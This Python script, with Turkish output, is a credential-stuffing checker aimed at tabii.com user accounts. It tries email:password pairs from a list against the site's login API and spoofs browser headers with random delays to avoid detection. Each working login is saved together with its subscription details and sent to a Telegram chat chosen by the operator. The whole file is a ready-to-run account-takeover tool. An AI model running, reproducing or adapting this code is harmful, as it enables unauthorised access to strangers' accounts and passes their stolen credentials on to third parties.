import requests
import json
import time
import random
import os
from colorama import Fore, Style, init


init(autoreset=True)


R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RESET = Style.RESET_ALL


def print_title():
    print(C + "==================================================" + RESET)
    print(C + "       Tabii.com Hesap CHECKER (FurkanKumri)  " + RESET)
    print(C + "==================================================" + RESET)


def send_telegram_message(token, chat_id, message):

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"{R}[!] Telegram Bildirim Hatası: {e}{RESET}")
        return False


def check_account(email, password, headers):
    
    login_url = 'https://eu1.tabii.com/apigateway/auth/v2/login'
    profile_url = 'https://eu1.tabii.com/apigateway/auth/v2/me'

    
    login_data = {
        'email': email,
        'password': password,
        'remember': False,
    }

    try:
        response = requests.post(login_url, headers=headers, json=login_data, timeout=10)
        
        if response.status_code != 200:
            return "BAD", None, f"Giriş Başarısız (HTTP {response.status_code})"

        data = response.json()
        access_token = data.get('accessToken')

        if not access_token:
           
            error_message = data.get('message', 'Geçersiz Kimlik Bilgileri')
            return "BAD", None, error_message

        
        profile_headers = headers.copy()
        profile_headers['Authorization'] = f'Bearer {access_token}'

        profile_response = requests.get(profile_url, headers=profile_headers, timeout=10)
        
        if profile_response.status_code != 200:
            return "HIT", f"{email}:{password}", f"Giriş Başarılı, Profil Çekilemedi (HTTP {profile_response.status_code})"

        profile_data = profile_response.json()
        
        
        subscription = profile_data.get('subscription', {})
        status = subscription.get('status', 'Yok')
        title = subscription.get('title', 'Yok')
        
        details = f"Durum: {status}, Plan: {title}"
        
        return "HIT", f"{email}:{password}", details

    except requests.exceptions.RequestException as e:
        return "ERROR", None, f"İstek Hatası: {e}"
    except json.JSONDecodeError:
        return "ERROR", None, "JSON Çözümleme Hatası"
    except Exception as e:
        return "ERROR", None, f"Beklenmedik Hata: {e}"

def main():
    print_title()

    
    print(Y + "Lütfen gerekli bilgileri girin:" + RESET)
    telegram_token = input(C + "Telegram Bot Token'ı: " + RESET)
    telegram_chat_id = input(C + "Telegram ID'si: " + RESET)
    
 
    account_file = input(C + "Hesap Listesi Dosya Yolu (e.g., accounts.txt): " + RESET)

    if not os.path.exists(account_file):
        print(f"{R}[!] HATA: Belirtilen dosya yolu bulunamadı: {account_file}{RESET}")
        return

    
    try:
        with open(account_file, 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f if line.strip() and ':' in line]
    except Exception as e:
        print(f"{R}[!] HATA: Dosya okuma hatası: {e}{RESET}")
        return

    if not accounts:
        print(f"{Y}[!] Uyarı: Dosyada geçerli hesap (email:password formatında) bulunamadı.{RESET}")
        return

    total_accounts = len(accounts)
    hit_count = 0
    bad_count = 0
    error_count = 0
    
    
    output_file = "tabii.txt_ful_hits"
    print(f"\n{Y}[*] Toplam {total_accounts} hesap yüklendi. Sonuçlar {output_file} dosyasına kaydedilecektir.{RESET}")
    

    headers = {
        'authority': 'eu1.tabii.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'tr',
        'app-version': '1.5.6',
        'content-type': 'application/json;charset=UTF-8',
        'device-brand': 'Linux',
        'device-connection-type': 'wifi',
        'device-id': '1761637042587_363640',
        'device-language': 'tr-TR',
        'device-model': 'Linux undefined - Chrome',
        'device-name': 'Linux undefined - Chrome',
        'device-network': '4g',
        'device-orientation': 'Portrait',
        'device-os-name': 'Linux',
        'device-os-version': 'Web',
        'device-resolution': '360x806',
        'device-timezone': 'Europe/Istanbul',
        'device-type': 'WEBDesktop',
        'origin': 'https://www.tabii.com',
        'platform': 'Web',
        'referer': 'https://www.tabii.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'x-country-code': 'TR',
    }

    
    for i, account in enumerate(accounts):
        email, password = account.split(':', 1)
        
        
        progress_msg = f"[{i+1}/{total_accounts}] HIT: {hit_count} | BAD: {bad_count} | ERR: {error_count}"
        print(f"\r{B}[*] {progress_msg} - Kontrol Ediliyor: {email}{RESET}", end="", flush=True)

        result_type, result_account, result_details = check_account(email, password, headers)
        
       
        if result_type == "HIT":
            hit_count += 1
            full_hit_line = f"{result_account} | {result_details}"
            
            
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(full_hit_line + "\n")
            
            
            telegram_message = (
                f"*YENİ BAŞARILI GİRİŞ (HIT)!*"
                f"\n\n*Hesap:* `{result_account}`"
                f"\n*Detay:* {result_details}"
            )
            send_telegram_message(telegram_token, telegram_chat_id, telegram_message)
            
            
            print(f"\r{G}[+] HIT! {full_hit_line}{RESET}")

        elif result_type == "BAD":
            bad_count += 1
            
            print(f"\r{R}[-] BAD! {email}:{password} | {result_details}{RESET}")

        elif result_type == "ERROR":
            error_count += 1
            
            print(f"\r{M}[!] ERROR! {email}:{password} | {result_details}{RESET}")
            
        
        time.sleep(random.uniform(1, 3))

    
    print(f"\n\n{C}==================================================" + RESET)
    print(f"{C}Kontrol Tamamlandı!{RESET}")
    print(f"{G}[+] Başarılı Giriş (HIT): {hit_count}{RESET}")
    print(f"{R}[-] Başarısız Giriş (BAD): {bad_count}{RESET}")
    print(f"{M}[!] Hata (ERROR): {error_count}{RESET}")
    print(f"{Y}[*] Toplam Denenen: {total_accounts}{RESET}")
    print(f"{C}Başarılı hesaplar {output_file} dosyasına kaydedildi.{RESET}")
    print(f"{C}==================================================" + RESET)

if __name__ == "__main__":
    main()